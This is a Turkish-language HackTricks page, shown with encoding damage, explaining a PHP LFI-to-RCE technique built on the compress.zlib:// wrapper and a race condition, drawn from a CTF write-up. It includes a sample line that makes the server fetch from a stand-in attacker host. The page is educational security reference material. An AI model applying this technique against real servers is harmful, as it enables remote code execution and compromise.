# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) **dark-web** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve **Ã¼cretsiz** olarak motorlarÄ±nÄ± deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

***

### `compress.zlib://` ve `PHP_STREAM_PREFER_STDIO`

`compress.zlib://` protokolÃ¼ kullanÄ±larak aÃ§Ä±lan bir dosya, `PHP_STREAM_PREFER_STDIO` bayraÄŸÄ± ile yazma iÅŸlemine devam edebilir ve daha sonra baÄŸlantÄ±ya gelen verileri aynÄ± dosyaya yazabilir.

Bu, aÅŸaÄŸÄ±daki gibi bir Ã§aÄŸrÄ± anlamÄ±na gelir:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Sunucudan http://attacker.com/file isteyen bir istek gÃ¶ndereceÄŸiz, ardÄ±ndan sunucu isteÄŸi geÃ§erli bir HTTP yanÄ±tÄ± ile yanÄ±tlayabilir, baÄŸlantÄ±yÄ± aÃ§Ä±k tutabilir ve daha sonra dosyaya yazÄ±lacak ek verileri bir sÃ¼re sonra gÃ¶nderebilir.

Bu bilgiyi php-src kodunun main/streams/cast.c bÃ¶lÃ¼mÃ¼nde gÃ¶rebilirsiniz:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### RCE'ye YarÄ±ÅŸ KoÅŸulu

[**Bu CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) Ã¶nceki hile kullanÄ±larak Ã§Ã¶zÃ¼ldÃ¼.

SaldÄ±rgan, **kurban sunucunun saldÄ±rganÄ±n sunucusundan bir dosyayÄ± okuyarak baÄŸlantÄ± aÃ§masÄ±nÄ± saÄŸlayacak** ve bunu **`compress.zlib`** protokolÃ¼ kullanarak yapacak.

Bu **baÄŸlantÄ±** varken saldÄ±rgan, sunucu tarafÄ±ndan sÄ±zdÄ±rÄ±lan geÃ§ici dosyanÄ±n yolunu **dÄ±ÅŸa aktaracak**.

Bu **baÄŸlantÄ±** hala aÃ§Ä±kken saldÄ±rgan, kontrol ettiÄŸi geÃ§ici dosyayÄ± yÃ¼kleyen bir LFI'Ä± **sÃ¶mÃ¼recek**.

Ancak, web sunucusunda **`<?` iÃ§eren dosyalarÄ±n yÃ¼klenmesini engelleyen bir kontrol** bulunmaktadÄ±r. Bu nedenle, saldÄ±rgan bir **YarÄ±ÅŸ KoÅŸulu**'nu istismar edecektir. Hala aÃ§Ä±k olan baÄŸlantÄ±da, **saldÄ±rgan**, web sunucusunun yasaklÄ± karakterleri iÃ§eren dosyayÄ± kontrol ettiÄŸi **sonrasÄ±nda PHP yÃ¼klemesini GÃ–NDERECEKTÄ°R** ancak **iÃ§eriÄŸini yÃ¼klemeden Ã–NCE**.

Daha fazla bilgi iÃ§in YarÄ±ÅŸ KoÅŸulu ve CTF aÃ§Ä±klamasÄ±nÄ± [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) adresinden kontrol edebilirsiniz.

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini kontrol etmek iÃ§in Ã¼cretsiz** iÅŸlevsellikler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>SÄ±fÄ±rdan Kahraman'a AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
